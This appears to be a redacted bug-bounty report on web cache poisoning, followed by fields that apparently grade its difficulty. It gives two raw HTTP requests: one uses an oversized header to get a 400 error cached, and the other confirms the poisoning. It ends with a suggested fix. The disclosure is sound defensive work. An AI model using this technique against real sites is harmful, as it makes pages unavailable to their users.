title: Web Cache Poisoning on  █████
content:
Description:
The web application https://████████ uses a web cache to more efficiently serve its pages to the users. An attacker can send a malformed request which the server caches the response of and sends it to the users.
Impact
An attacker can alter the web cache, making the web application unavailable for as long as they wish.
System Host(s)
█████████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Send the following request to the server:
Code 8.29 KiB
1GET /yeettest?yeettest=1 HTTP/1.1
2Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
3Accept-Encoding: gzip,deflate
4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
5Host: www.█████
6Connection: Keep-alive
7yeetheadertest1:
The server will return a 400 status code response and cache the response.
Now, send the request below. Normally, it should return a 404 response.
Code 304 Bytes
1GET /yeettest?yeettest=1 HTTP/1.1
2Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
3Accept-Encoding: gzip,deflate
4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
5Host: www.████████
6Connection: Keep-alive
However it returns the same response as the previous one, which means that the response was cached.
Note: I have done these tests on the path /yeettest?yeettest=1 in order to not disrupt the experience of the website's users. However, an attacker would use this bug on the main page.
Suggested Mitigation/Remediation Actions
Do not cache responses with error-related status codes.
steps: Send a malformed request with a large header to the server (e.g., GET /yeettest?yeettest=1 with a very long 'yeetheadertest1' header). The server will return a 400 status code and cache this response.
Send a normal request to the same endpoint (e.g., GET /yeettest?yeettest=1). The server will return the cached 400 response instead of the expected 404, confirming the cache poisoning.
vuln_description: The web application caches error responses (e.g., 400 status codes) for malformed requests. An attacker can exploit this by sending a crafted request that triggers an error, causing the server to cache the error response. Subsequent legitimate requests to the same endpoint will then receive the cached error response, potentially disrupting service for other users.
reason: The attack is straightforward and involves only two steps: sending a malformed request to poison the cache and then verifying the cache poisoning by sending a normal request. There are no complex interactions or novel logic involved, and the vulnerability is a common misconfiguration in web caching systems.
